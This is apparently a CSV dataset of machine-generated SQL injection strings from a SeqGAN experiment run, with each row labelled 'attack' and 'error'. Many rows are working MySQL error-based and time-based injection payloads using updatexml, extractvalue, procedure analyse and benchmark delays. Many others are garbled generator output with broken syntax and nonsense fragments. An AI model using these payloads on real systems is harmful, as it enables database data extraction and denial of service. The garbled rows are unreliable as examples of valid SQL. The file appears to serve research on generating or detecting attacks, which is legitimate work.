attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and """" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,548
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,549
attack,"1%"" and extractvalue  (  6528  (  (  7982,  (  select   (  )  e  )  3393,1   (  extractvalue  (  (  7982,1   (  )  )  select 0 from dual  )  e  =  (  elt  case when   (  u 0 from dual  )   end  (  el  (  elt  (  e  (  0x2e,md5  (  (  0x5c,  (  benchmarkd5  =  (  3393,1   )    (  extractvalue  (  9788,  (  select   (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,550
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,551
attack,"1'  )  (  case and extractvalue  (  (  (  (  3393,concat  (  (  0x2e,0x7171706a71,  (  (  benchmark(  (   (  1759(  (  (  5000000,md5  (  (  3393  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  (  elt  (  0x5c,  (  (  select   (  4660  =  8868  (  0x5c,0x7171706a71,  (  benchmark  (  benchmark  (  5000000(  0x2e,md5  (  0x4b774c75   (  (  (  elt  (  elt  (r",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,552
attack," AND or updatexml  (  (  (  (  (  (  (  0x2e,0x78  =  (  9255,1   )    (  extractvalue  (  (  0x4b774c75   (  (  (  elt  (  e  (  (  1808  =  3393,md5  (  (  0x2e,  (  select   (  elt  (  e  (  0x5c,md5  (  0x4b774c75   end  (  elt  )  0x2e,md5  (  0x2e,md5  (  0x5c,0x7171706a71,  (  select   (  elt  7982  =  1759(  (  (  select   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,553
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,554
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,555
attack,"1%'   )    )    AND (  extractvalue  (  (    (  9627,concat  (  (  (  (  0x5c,  (  benchmark  (  (  benchmark  (  (   (   (  5423  (  elt  (  3393  =  (  ~  (  (  0x5c,  (  benchmark  (  (  benchmark  (  5000000(  (  benchmark  (  benchmark  (  (  7982,1   )    (  extractvalue  (  9627,m,md5  (  0x5c",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,556
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%0x717a767a71""  =  ""o'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'kpa",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,557
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,558
attack,"1,""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  "" extractvalue  (  (  (  (  (  7050   i ur anal  )  )  )  e  )  select 0 from dual  )  e  )  6804  (  (  elt  (  1808  =  (  9627,md5  1808  =  (  (  (  (  0x5c,0x7171706a71,  (  select   (  5423  )  (  (  e  (  extractvalue  (  (  select   (  u  (  elt  (  e  (  e  =  1759(  =  (  1297,1   (  extractvalue  (  9627",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,559
attack, AND 1  =  utl_danalysSELECT fnam,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,560
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,561
attack,"1% pro1272ikendduan duana  )  )   end  (  )   (  1354  (  (   end  (  elt  (  elt  (  1808  =  (  8868  (  (  7982  =  (  3393,  (  (  benchmark  (  (  5000000,m5  (  (  (  t  (  benchmark  (  (  5000000,md5  (  0x5c,0x7171706a71,  (  select   (  elt   (  extractvalue  (  (  1759(  0x5c,0x7171706a71,0x7171706a71,  (  benchmark  (  (  (  select   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,562
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,563
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,564
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,565
attack,"1%%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,566
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,567
attack,"1%""  )   procedure anal  )  )  )  (   0 0from d 0 from 0 from dual   (  8868  (  el  (  (  1808  =  (  5433  =  (  3393,0x717a767a71  (  =  (  (  6212  )   end  (   (  8375  (  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  5322  =  (  eltal  )  =  (  1808,1   )    (  updatexml  29170x7171706a71,  (  (  (  benchmark  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,568
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,569
attack,"1%"" and extractvalue  (  (  (  3393,concat  (  0x2e,0x7171706a71,  (  (  5000000(  1808,concat  (  (  (  (  0x2e,  (  select   (  elt  (  elt  (  0x2e,0x7171706a71,  (  =  (  9627,concat  (  (  (  0x5c,0x7171706a71,  (  (  =  (  6581concat  (  0x5c,  (  5000000(  (  1808  =  (  (    (  (  =  (  (  (  0x5c,  (  (  (  select   (  9103  =  (  e  (  benchmark  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,570
attack,"1%""   )    )    (  extractvalue  (  benchmark  (  (  8862,concat  (  (  (  0x2e,concat  =  (  (  3364  =  (  9627,concat  (  0x5c,0x7171706a71,  (  5000000(  0x5c,  (  (  1808,  (  (  select   (  el  (  1808  =  (  (  1297  =  (  (  select   (  elt  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  select   (  elt  (  1297  =  (  (  (  3393  =  (  extractvalue  (  9255,1   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,571
attack,"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,572
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,573
attack,"1%""   )    AND 1559 from extractvalue  (  (  (  (  (  (  (  (  (  2917,  (  (  (  (  (  (  (  2917,concat  (  (  0x2e,0x7171706a71,  (  (  9255,concat  (  (  0x2e,md5  (  =  (  (  3393,1   )    )     (    (  select   (  )as in ad5  (  1 from a  =  6134  (  (  3393,1   )    (  extractvalue  (  3393,concat  (  (  (  (  1808  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,574
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,575
attack," pro'ce analyse  (  (  elt  )  0x2e,0x7171706a71,  (  (  1808,m5  (  select   (  5433  (  case 0 0 from 0 from(  (  3393,l  (  (  0x2e,concat  (  (  (  0x5c,  (  (  benchmark  (  (  (  benchmark  (  (  (  5000000,md5  (  select   (  elal  =  7529  =  (  3393,1   )    (  extractvalue  (  (   (  5603  (  1808,1   )    (  extractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,576
attack,"1%"" and extractvalue  (  (  (  (  (  3393,concat  (  (  (  0x5c,0x7171706a71,  (  benchmark  (  (  (  benchmark  (  (  (  benchmark  (  =  (  7982,concat  (  (  (  7982  =  (  (  0x5c,0x7171706a71,1   (  )  ut  l in a  1  =  (  1 extractvalue  (  (  (  1759  (  (  (  select   (  elt  (  elt  (  1808  =  (  (  0x5c,  (  (  5000000(  (  (  1808",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,577
attack,"1%"" and updatexml  (  (  =  (  (  (   (  8375  (  (  (  (  select 0 du 0 d5  (  eltan  el  (  1297  =  (  7982,1   )    (  extractvalue  (  (  9255,concat  (  ,  (  benchmark  (  9627,md5  (  (  (    (  extractvalue  (  (  (  7982,md5  =  (  (  0x5c,0x7171706a71,  (  select   (  elt  7982  =  (  (  (  1808  =  (  3393,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,578
attack,"1%""   )    )    AND b_n_namSytanaltaddone0x78   e  (  1812   (  (  3393,1   )    (  extractvalue  (  (  5000000,md5  (  1759  (  =  (  3393,4688  (  3393,1   )    AND 2501  extractvalue  (  (  (  5000000(   (  (  1297  =  (  (  benchmark  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  0x5c,  (  3539  =  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,579
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,580
attack,"' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'zm",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,581
attack,"1%""R%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,582
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,583
attack,"1%""   )    )    AND      )  extractvalue  (  (  (  1808,concat  (  (  (  (  (  (  (  (  0x5c,  (  1759(  (  (  benchmark  (  1297,concat  (  5198  (  (  3393,m5  (  (  (  2917  =  (  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  0x2e,  (  select   (  )   SELECT due  (  elt  elt  (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,584
attack,"1%'  =  'bbocedu      )    (   (  (  (  elt  (  elt  (  e  =  7982  =  (  1 a  (  o  (  1808,concat  (  (  0x5c,0x7171706a71,  (  select   (  e  (  elt  (  3539  =  7982,1   )    )     (  g  (  1 a  (  (   (    0x5c,0x7171706a71,  (  (  (  benchmark  (  (  benchmark  (  (  benchmark  (  5000000(  (  1808,concat  (  (  (  0x2e,0x7171706a71,  (  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,585
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,586
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,587
attack,"1%""   )    (  extractvalue  (  (  (  (  =  8421  (  (  1808,concat  (  0x5c9836concat  (   (  (  (  (  elt  (  elt  (  0x2e,0x7171706a71,  (  =  2768  (  1759(  (  1808  =  (  1759,  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  benchmark  (  select   (   (  9393  (  (  elt  e  (  0x2e,  (  (  benchmark  (  benchmark  (  5000000(  (  0x5c,0x7171706a71,  (  (  benchmark  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,588
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,589
attack," AND 5406  =  * from  (  0x5c,0x7171706a71,  (  (  (  select   (  elt  (  elt  (  3393  =  (  1297,1   )    )    AND wwwblytanalylyse  (  case  =  ut  (  e  (  0x5c,0x7171706a71(  (  select   (  )  elt  (  1297  =  (  2917,md5  (  (  0x2e,md5  =  (  (  0x2e,  (  select   (  elt  (  (  7982  =  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,590
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,591
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  ')    proceden FROM unal  )  el  )  /  (  (  select   (  8375  =  (  benchmark  (  (  1808  =  (  3393  (  select   (  elt  (  e  (  0x2e,A  (  9627,md5  (  (  0x2e,0x7171706a71,  (  0x2e,0x7171706a71,  (  (  select   (  5433  )   (  3681  (  (  (  0x2e,0x7171706a71(  (  select   (  el    (  0x5c,  (  5000000,md5  (  0x2e,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,592
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,593
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,594
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,595
attack,1%pkphf'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,596
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,597
attack,"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,598
attack,1%1%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,599
attack,"1%""   )    AND 'i'  =  updatexml  (  (  3393,concat  (  (  (  (  (  (  (  (  (  1808(  (  (  (  (  0x2e,0x7171706a71,  (  benchmark(  (  5000000,md5  (  (  0x5c,  (  select   (  9393  =  (  case 0 0 from dual  )   end  (  case 0 1724  (  )  el analse  (  5000000,md5  (  0x2e,0x7171706a71,  (  0x4b774c75   (  (  elt  (  elt  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,600
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,601
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'nb'  =  'k'  =  'z",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,602
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,603
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,604
attack,"1%"",0x717a767a71  )  (  (  z  2917extractvalue  (  (  (  (  (  (  (  (  0x5c,0x7171706a71(  (  benchmark  (  7982,concat  (  (  (  select   (  elt  (  1297  =  3393,  (  (  select   (  elt  (  1297  =  3393,  (  (  5000000(  =  (  3393,1   (  extractvalue  (  (  9627,concat  (  (  0x2e,md5  (  0x2e,md5  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  e(",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,605
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,606
attack," AND else updatexml  (  (  (  (  (  0x2e,0x7171706a71,  (  9627,md5  (  0x5c,0x7171706a71,  (  select   (  0x5c,0x7171706a71(  (  elt  (  3393  =  0x5c(  3393,md5  (  (  0x2e,md5  (  (  (  0x52515a50   end0  )  (   (  5433  (  (  elt  (  1808,  (  3393,1   )    )    AND 'i'  select   (  case when   (  5198  (  (  benchmark  (  (  5000000(  0x2e,0x7171706a71,  (  select   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,607
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  'kpprc",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,608
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,609
attack,"1%""   )    )    AND AND AND  =  extractvalue  (  9627,concat  (  (  0x4b774c75   (  1812  (  (  elt  1808  =  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  e  (  0x2e,md5  (  select   (  1812  )  (  (  (  7982  =  (  (  0x5c,  (  select   (  elt  )  0x5c,0x7171706a71,  (  select   (  1812  )   (  (  case when   (  (  5433  )   (  (  (  elt  (  8375",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,610
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,611
attack,"1%""   )    )    AND and,8666  ~  (  (  (  1 from updatexml  3393,extractvalue  (  (  (  8862,  (  (  =  (  9627,concat  (  (  benchmark(  (  (  (  elt  (  1297  =  updatexml  (  (  (  9627,md5  (  5603  =  (  (  0x2e,  (  5000000,md5  (  (  1808,md5  (  =  (  (  5000000,md5  (  0x5c,0x7171706a71,  (  select   (  e  (  elt  (  el",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,612
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ' pro0x78naddreyse anal    )    )   (  (  9667  =  (  7982,1   )    (  extractvalue  (  (  7982,1   )    AND dAND du an a  )  1808=  (  (  7982,1   or extractvalue  (  (  (  1297  =  (  5406  (  =  (  1759,md5  (  1808  =  (  (  (  select   (  (  elt  (  elt  9788  =  (  3393,md5  (  (  0x5c,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,613
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,614
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,615
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,616
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,617
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,618
attack,"1%""   )    US0x717a767a71&   )    )    AND FROM SYS.1AME   )    )YSextractvalue  (  (  (  0x52515a50  )  =  2162 and extractvalue  (  (  (  (  8862  =  (  0x2e,0x7171706a71,  (  select   (  el  (  0x5c,0x7171706a71,  (  select   (  )  elt  (  0x2e,0x7171706a71,  (  9627,concat  (  (  (  0x2e,0x7171706a71,  (  select   (  1354  =  (  7982,  (  0x5c,  (  (  5000000,md5  (  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,619
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,620
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,621
attack,1%'  =  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,622
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,623
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,624
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,625
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,626
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,627
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,628
